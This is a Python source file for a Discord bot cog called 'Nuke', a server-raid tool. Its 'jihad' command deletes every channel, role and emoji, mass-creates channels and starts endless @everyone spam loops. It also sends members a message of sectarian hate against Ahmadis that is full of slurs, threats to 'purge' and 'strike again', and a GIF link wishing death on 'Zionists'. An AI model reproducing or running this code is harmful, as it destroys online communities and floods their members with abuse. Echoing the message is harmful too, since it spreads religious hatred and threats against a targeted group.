import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.message = """بمباری کی
احمدیہ کفر ہیں
This sad excuse for a server has existed for way too long, promoting and spreading falsehood, "converting" many with some stupid form and leading them to hellfire. We have done you a huge favour, now convert to Sunnism and do tawbah to Allah for your transgression.
 سرور کے لئے یہ افسوس ناک عذر بہت لمبے عرصے سے موجود ہے ، جھوٹ کو فروغ دینے اور پھیلانے ، بہت سے لوگوں کو کچھ بیوقوف شکل میں "تبدیل" اور جہنم کی طرف لے جا رہا ہے۔ ہم نے آپ پر بہت بڑا احسان کیا ہے ، اب سننیت میں تبدیل ہوجائیں اور آپ کی سرکشی پر اللہ کا توبہ کریں۔

May Allah forgive both you and us, and lead us to the straight path.
**But spread kufr once again, and we shall strike again.**
I promise you this.
**Islam has won and prevailed, we shall purge those like you from our ummah, as you choose to divide it. Never cross us again, you street shitting toilet worshipping dogs. Your "mahdi" died in his birth place, the toilet. Do not make us remind you of your weakness and gullibleness.**
الله أكبر
انتصار الاسلام
ضد الكفار
لا اله الا الله محمد رسول الله الاحمدية اعداء التوحيد
https://media.giphy.com/media/LrFUQDghPpoFRszRIf/giphy.gif
https://media.discordapp.net/attachments/659164270222639123/677613643390779412/VID_20191125_142634_981_001_1.gif
https://tenor.com/view/pakistanidance-dangerous-funny-dance-pakistan-gif-9367747
https://media.discordapp.net/attachments/658439558647775232/659857220175134739/Zionists_You_Will_Die_In_Gaza_1.gif
https://i.makeagif.com/media/6-14-2015/s3OMdO.gif
https://tenor.com/view/assad-fake-smile-laugh-gif-13215835
"""
        self.invites = "@everyone"

    async def delete_channels(self, ctx):
        print("Deleted channels ( ", end='', flush=True)
        for channel in ctx.guild.channels:
            if not channel.name == "no-delete":
                try:
                    await channel.delete()
                    print(f"'{channel.name}', ", end='', flush=True)
                except:
                    pass
            else:
                pass
        print(')\n')

    async def delete_roles(self, ctx):
        print("Deleted roles ( ", end='', flush=True)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"'{role.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_emojis(self, ctx):
        print("Deleted emojis ( ", end='', flush=True)
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"'{emoji.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def ban_members(self, ctx):
        print("Banned members ( ", end='', flush=True)
        for member in ctx.guild.members:
            try:
                if not member.id in self.no_ban:
                    # await ctx.guild.ban(member, reason="NUKE")
                    print(f"'{member.name}', ", end='', flush=True)
                    await member.send(f"{self.message}\n{self.invites}")
            except:
                pass
        print(')\n')

    async def make_channels(self, ctx, name):
        for i in range(100):
            try:
                await ctx.guild.create_text_channel(f"{name}")
            except:
                print(f"Created ( {i} channels )")

    async def spam_channel(self, ctx):
        while True:
            try:
                await ctx.send(f"{self.message}\n{self.invites}\n@everyone")
                await asyncio.sleep(3)
            except:
                pass

    async def spam_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            if channel.name == "no-delete":
                continue
            try:
                await channel.send(">spam")
            except:
                pass



    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.author.bot:
            if ctx.content.startswith(">spam"):
                await self.spam_channel(ctx.channel)

    @commands.command()
    async def jihad(self, ctx, channelname="allahu-akbar"):
        await self.ban_members(ctx)
        await self.delete_channels(ctx)
        await self.delete_roles(ctx)
        await self.delete_emojis(ctx)
        await self.make_channels(ctx, channelname)
        await self.spam_all_channels(ctx)
        print("Done!")



def setup(bot):
    bot.add_cog(Nuke(bot))